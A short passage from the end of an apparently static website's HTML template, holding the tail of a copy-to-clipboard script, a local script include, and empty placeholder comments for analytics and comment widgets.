      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
